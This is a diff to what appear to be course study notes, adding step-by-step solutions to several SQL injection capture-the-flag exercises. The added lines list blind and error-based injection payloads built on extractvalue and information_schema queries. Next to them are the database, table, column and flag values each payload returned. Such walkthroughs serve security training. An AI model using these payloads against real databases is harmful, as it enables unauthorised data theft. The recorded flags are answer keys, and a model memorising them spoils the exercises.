@@ -106,15 +106,64 @@
 #  4. Find database
 #    normaltic' and (ascii(substr((select database()),1,1)) > 0) and '1'='1     = Attack format
 #  5. Find table name
-#    select table_name from information_schema.tables where table_schema = 'database_name'
+#    select table_name from information_schema.tables where table_schema = 'database_name' limit 0,1
 #  6. Find column name
+#    select column_name from information_schema.columns where table_name = 'flagTable_this' limit 0,1
 #  7. Find data
+#    select flag from flagTable_this limit 0,1
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
 # Assignment
 #  1. Review Error-base SQL Injection
 #  2. Review Blind-based SQL Injection
+
+#  CTF - SQL Injection (Blind Practice)
+#  1. database      => blindSqli
+#  2. table_name      => plusFlag_Table
+#  3. coulum_name      => flag
+
 #  3. Review SQL Injection
 #  4. SQL Injection - CTF
 #  5. Web Site Development
+
+# CTF - SQL Injection 3
+# 1. normaltic' and extractvalue('1', concat(0x3a,(select database()))) and '1'='1         => sqli_2
+# 2. normaltic' and extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema = 'sqli_2' limit 0,1))) and '1'='1      => flag_table
+# 3. normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 0,1))) and '1'='1      => flag
+# 4. normaltic' and extractvalue('1', concat(0x3a,(select flag from flag_table limit 0,1))) and '1'='1
+
+# CTF - SQL Injection 4
+# 1. normaltic' and extractvalue('1', concat(0x3a,(select database()))) and '1'='1         => sqli_2_1
+# 2. normaltic' and extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema = 'sqli_2_1' limit 0,1))) and '1'='1      => flag_table
+# 3. normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 0,1))) and '1'='1      => flag1
+# 4. normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 1,1))) and '1'='1      => flag2
+# 5. normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 2,1))) and '1'='1      => flag3
+# 6. normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 3,1))) and '1'='1      => flag4
+# 7. normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 4,1))) and '1'='1      => flag5
+# 8. normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 5,1))) and '1'='1      => flag6
+# 9. normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 6,1))) and '1'='1      => flag7
+# 10. normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 7,1))) and '1'='1      => flag8
+# 11. normaltic' and extractvalue('1', concat(0x3a,(select flag1 from flag_table limit 0,1))) and '1'='1      => segfault{1
+# 12. normaltic' and extractvalue('1', concat(0x3a,(select flag2 from flag_table limit 0,1))) and '1'='1      => you_
+# 13. normaltic' and extractvalue('1', concat(0x3a,(select flag3 from flag_table limit 0,1))) and '1'='1      => must_
+# 14. normaltic' and extractvalue('1', concat(0x3a,(select flag4 from flag_table limit 0,1))) and '1'='1      => concat_
+# 15. normaltic' and extractvalue('1', concat(0x3a,(select flag5 from flag_table limit 0,1))) and '1'='1      => this_
+# 16. normaltic' and extractvalue('1', concat(0x3a,(select flag6 from flag_table limit 0,1))) and '1'='1      => string_
+# 17. normaltic' and extractvalue('1', concat(0x3a,(select flag7 from flag_table limit 0,1))) and '1'='1      => good
+# 18. normaltic' and extractvalue('1', concat(0x3a,(select flag8 from flag_table limit 0,1))) and '1'='1      => job}
+
+# CTF - SQL Injection 5
+# 1. database()    => sqli_2_2
+# 2. table_name    => flagTable_this
+# 3. columns_name    => flag
+# 4. data      => 13
+
+# CTF - SQL Injection 6
+# 1. database()    => sqli_3
+# 2. table_name      => flag_table
+# 3. columns_name      => flag
+
+
+
+
